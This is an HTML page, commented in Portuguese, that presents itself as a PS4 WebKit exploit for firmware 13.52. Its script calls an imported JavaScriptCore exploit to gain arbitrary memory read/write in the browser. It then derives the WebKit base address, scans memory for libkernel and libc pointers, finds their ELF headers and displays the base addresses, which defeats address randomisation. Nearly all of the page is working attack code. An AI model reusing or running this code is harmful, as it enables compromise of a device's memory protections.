<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;

#sb{width:100%;max-width:720px;background:#0c0e18;border:1px solid #1a1d2e;
  border-radius:6px;padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
#dot{width:9px;height:9px;border-radius:50%;background:#333;flex-shrink:0;transition:background .3s}
#dot.r{background:#f0a500;animation:p 1s infinite}
#dot.ok{background:#00c853}
#dot.e{background:#ff4444}
@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}

/* console */

.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}

/* cards */
#cards{width:100%;max-width:720px;display:grid;
  grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
.card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}

/* constants output box */
#cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
  border-radius:6px;padding:12px;display:none;margin-bottom:8px;
  font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
#cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
  border-bottom:1px solid #0a2a15;padding-bottom:4px}

</head>
<body>

<h1>PS4 WebKit Exploit (13.52)</h1>
<div id="fw">detectando...</div>

<div id="sb">
  <div id="dot" class="r"></div>
  <div id="st">Inicializando...</div>
</div>
<div id="bars">
  <span id="ba">tentativa: 1</span>
  <span id="bg">estágio: init</span>
</div>

<div id="con"></div>

<div id="cards">
  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
  <div class="card"><div class="cl">Status</div><div class="cv na" id="c-g">Aguardando</div></div>

<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') { $st.textContent = m; $dot.className = s; }
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

// ═════════════════════════════════════════════════════════════════════════════
// VARREDURA DE PONTEIROS NA MEMÓRIA DO WEBKIT
// Estratégia: varrer a seção .data do WebKit procurando por ponteiros
// que apontem para libkernel (hi=0x80) e libc (hi=0x90-0x98).
// ═════════════════════════════════════════════════════════════════════════════

async function scanForBases(p, webkitBase) {
  logH('VARREDURA DE PONTEIROS NO WEBKIT');

  // Range de varredura: .data/.bss típica do WebKit
  // Ajustável conforme necessário
  const SCAN_START = 0x2800000;
  const SCAN_END   = 0x3A00000;
  const STEP       = 8;        // ponteiros 64-bit alinhados
  const MAX_CANDS  = 20;       // limitar candidatos

  let libkernelCands = [];
  let libcCands = [];
  let scanned = 0;

  for (let off = SCAN_START; off < SCAN_END; off += STEP) {
    scanned++;

    // Log de progresso a cada 0x80000 bytes (~512KB)
    if ((off & 0x7FFFF) === 0) {
      let pct = Math.floor((off - SCAN_START) * 100 / (SCAN_END - SCAN_START));
      setStatus('Varrendo memória... ' + pct + '%');
    }

    try {
      let ptr = p.read8(webkitBase.add32(off));
      let hi = ptr.hi;
      let lo = ptr.low;

      // Pular nulos e não-alinhados
      if (lo === 0 && hi === 0) continue;
      if ((lo & 0x7) !== 0) continue;

      // libkernel: hi = 0x80
      if (hi === 0x80 && libkernelCands.length < MAX_CANDS) {
        // Verificar se a memória apontada é legível
        try {
          let testByte = p.read8(ptr); // ler 1 byte é suficiente
          libkernelCands.push({off, ptr});
        } catch(e) {}
      }
      // libc: hi = 0x90 a 0x98
      else if (hi >= 0x90 && hi <= 0x98 && libcCands.length < MAX_CANDS) {
        try {
          let testByte = p.read8(ptr);
          libcCands.push({off, ptr});
        } catch(e) {}
      }
    } catch(e) {
      // Memória não mapeada, pular
    }

    // Early exit se já temos candidatos suficientes
    if (libkernelCands.length >= MAX_CANDS && libcCands.length >= MAX_CANDS) break;
  }

  log('[+] Varredura completa: ' + scanned + ' ponteiros verificados');
  log('[+] ' + libkernelCands.length + ' candidatos libkernel (hi=0x80)');
  log('[+] ' + libcCands.length + ' candidatos libc (hi=0x90-0x98)');

  // Logar primeiros candidatos para debug
  for (let i = 0; i < Math.min(5, libkernelCands.length); i++) {
    let c = libkernelCands[i];
    log('    lk-cand[' + i + '] off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
  }
  for (let i = 0; i < Math.min(5, libcCands.length); i++) {
    let c = libcCands[i];
    log('    lc-cand[' + i + '] off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
  }

  // ─── Encontrar base da libkernel ───
  let libkernelBase = null;
  for (let cand of libkernelCands) {
    let base = findElfBase(p, cand.ptr, 0x400000);
    if (base) {
      libkernelBase = base;
      log('[+] libkernel base: 0x' + base.toString(16) + ' (via ptr 0x' + cand.ptr.toString(16) + ')', 'ok');
      break;
    }
  }

  // ─── Encontrar base da libc ───
  let libcBase = null;
  for (let cand of libcCands) {
    let base = findElfBase(p, cand.ptr, 0x400000);
    if (base) {
      libcBase = base;
      log('[+] libc base: 0x' + base.toString(16) + ' (via ptr 0x' + cand.ptr.toString(16) + ')', 'ok');
      break;
    }
  }

  return { libkernelBase, libcBase, libkernelCands, libcCands };
}

// Varre para trás em páginas de 0x1000 procurando \x7fELF
function findElfBase(p, startPtr, maxBack) {
  for (let back = 0; back < maxBack; back += 0x1000) {
    try {
      let test = startPtr.sub32(back);
      if (p.read32(test) === 0x464C457F) {
        // Verificar se é realmente um ELF64 válido
        let e_class = p.read8(test.add32(4));
        let e_machine = p.read16(test.add32(0x12));
        if (e_class === 2 && e_machine === 0x3E) {
          return test;
        }
      }
    } catch(e) {}
  }
  return null;
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO DE BASES
// ═════════════════════════════════════════════════════════════════════════════

async function validateBases(p, libkernelBase, libcBase) {
  logH('VALIDANDO BASES');
  let valid = { libkernel: false, libc: false };

  if (libkernelBase) {
    let magic = p.read32(libkernelBase);
    let elfClass = p.read8(libkernelBase.add32(4));
    let machine = p.read16(libkernelBase.add32(0x12));

    if (magic === 0x464C457F && elfClass === 2 && machine === 0x3E) {
      log('[✓] libkernel: ELF64 x86_64 válido', 'ok');
      valid.libkernel = true;
    } else {
      log('[✗] libkernel: ELF inválido (magic=0x' + magic.toString(16) + ' class=' + elfClass + ' machine=0x' + machine.toString(16) + ')', 'e');
    }

    let aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libkernel: alinhada a 0x1000' : '[✗] libkernel: desalinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;

    // Procurar stubs de syscall
    let stubs = 0;
    for (let off = 0; off < 0x100000; off += 0x10) {
      try {
        let b = [];
        for (let j = 0; j < 10; j++) b.push(p.read8(libkernelBase.add32(off + j)));
        if (b[0] === 0x48 && b[1] === 0xC7 && b[2] === 0xC0 &&
            b[7] === 0x49 && b[8] === 0x89 && b[9] === 0xCA) {
          stubs++;
          if (stubs >= 3) break;
        }
      } catch(e) {}
    }
    if (stubs >= 3) {
      log('[✓] libkernel: ' + stubs + ' stubs de syscall', 'ok');
    } else {
      log('[✗] libkernel: apenas ' + stubs + ' stubs', 'w');
      valid.libkernel = false;
    }
  }

  if (libcBase) {
    let magic = p.read32(libcBase);
    let elfClass = p.read8(libcBase.add32(4));
    let machine = p.read16(libcBase.add32(0x12));

    if (magic === 0x464C457F && elfClass === 2 && machine === 0x3E) {
      log('[✓] libc: ELF64 x86_64 válido', 'ok');
      valid.libc = true;
    } else {
      log('[✗] libc: ELF inválido', 'e');
    }

    let aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libc: alinhada a 0x1000' : '[✗] libc: desalinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN
// ═════════════════════════════════════════════════════════════════════════════

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluído!', 'ok');
  setStatus('Instalando R/W arbitrário...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
  setStatus('Varrendo memória...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
               ? OFFSET_wk_host_constructor_candidates[0]
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString(16));

    // ─── Varredura de ponteiros ───
    setTimeout(async () => {
      const result = await scanForBases(p, webkitBase);
      const libKernelBase = result.libkernelBase;
      const libcBase = result.libcBase;

      if (libKernelBase) setCard('c-lk', '0x' + libKernelBase.toString(16));
      if (libcBase) setCard('c-lc', '0x' + libcBase.toString(16));

      // Validar
      const valid = await validateBases(p, libKernelBase, libcBase);

      if (valid.libkernel && valid.libc) {
        log('[✓] Todas as bases validadas!', 'ok');
        setStatus('Bases mapeadas com sucesso', 'ok');
        setCard('c-g', 'Pronto');

        const cbox = document.getElementById('cbox');
        cbox.style.display = 'block';
        document.getElementById('c-out').textContent =
            '__ps5NativeCtor  = 0x' + ctorInt64.toString(16) + '\n' +
            'WebKit Base      = 0x' + webkitBase.toString(16) + '\n' +
            'libkernel Base   = 0x' + libKernelBase.toString(16) + '\n' +
            'libSceLibc Base  = 0x' + libcBase.toString(16) + '\n' +
            'Status           = Varredura concluída com sucesso.';
      } else {
        setStatus('Validação falhou', 'e');
        setCard('c-g', 'Falha');

        // Debug: mostrar candidatos mesmo se validação falhar
        logH('CANDIDATOS PARA DEBUG');
        log('libkernel candidatos:', 'w');
        for (let c of result.libkernelCands.slice(0, 5)) {
          log('  off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
        }
        log('libc candidatos:', 'w');
        for (let c of result.libcCands.slice(0, 5)) {
          log('  off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
        }
      }
    }, 500);

  } else {
    log('[-] __ps5NativeCtor não capturado.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}

main();
